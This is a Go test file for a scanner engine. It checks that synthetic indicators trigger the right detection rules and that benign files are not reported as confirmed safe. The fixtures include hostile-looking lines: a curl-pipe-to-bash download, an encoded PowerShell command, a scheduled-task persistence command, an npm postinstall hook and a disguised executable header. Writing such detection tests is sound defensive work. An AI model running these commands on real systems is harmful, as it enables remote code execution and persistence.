package engine

import (
	"strings"
	"testing"
)

// Synthetically generated text only: never execute, download, upload, run or
// unpack these indicators. These fixtures establish regression coverage for
// selected 95-rule categories, not a malware efficacy or false-positive rate.
func TestSyntheticDetectionCorpus(t *testing.T) {
	cases := []struct {
		name string
		file string
		text string
		wantRule string
	}{
		{"download pipe", "install.sh", "curl https://example.invalid/file.sh | bash", "EXEC002"},
		{"encoded powershell", "setup.ps1", "powershell -EncodedCommand QUJDREVGRw==", "EXEC005"},
		{"npm lifecycle", "package.json", `{"scripts":{"postinstall":"node build.js"}}`, "SUP001"},
		{"synthetic ssh key marker", "fixture.txt", "BEGIN OPENSSH PRIVATE KEY", "CRED002"},
		{"scheduled task", "task.ps1", "schtasks.exe /create /tn fixture /tr sample.exe", "PERS002"},
		{"script masquerading as image", "preview.png", "MZnot-a-real-program", "FILE001"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := NewReport(tc.file, "synthetic offline fixture")
			ScanBytes(r, tc.file, []byte(tc.text))
			Finalize(r)
			found := false
			for _, f := range r.Findings {
				if f.RuleID == tc.wantRule {
					found = true
					if f.Preview != "[matched content omitted; inspect original file in a safe editor]" &&
						f.RuleID != "FILE001" {
						t.Fatal("detection exported a sensitive source excerpt")
					}
					break
				}
			}
			if !found {
				t.Fatalf("expected %s from synthetic text; obtained %d findings", tc.wantRule, len(r.Findings))
			}
			if r.FilesSeen != 1 || r.FilesScanned != 1 || r.FilesSkipped != 0 {
				t.Fatalf("synthetic indicator inventory unexpectedly incomplete: %+v", r.Coverage)
			}
		})
	}
}

func TestBenignCorpusIsNotCalledConfirmedSafe(t *testing.T) {
	files := []struct{name,text string}{
		{"README.md", "This open-source project offers a simple hello world demo."},
		{"package.json", `{"scripts":{"test":"node test.js","build":"tsc"}}`},
		{"hello.py", "print('hello world')"},
		{"note.txt", "A regular text file without code or script execution."},
	}
	for _, tc := range files {
		r := NewReport(tc.name, "synthetic offline fixture")
		ScanBytes(r, tc.name, []byte(tc.text))
		Finalize(r)
		if len(r.Findings) != 0 || r.Score != 0 || r.FilesSeen != 1 {
			t.Fatalf("ordinary harmless fixture triggered unexpected heuristic: %s findings=%d score=%d", tc.name, len(r.Findings), r.Score)
		}
		warning := strings.Join(r.Warnings, " ")
		if !strings.Contains(warning, "cannot establish that software is safe") {
			t.Fatal("zero findings were incorrectly presented as proof of safety")
		}
	}
}
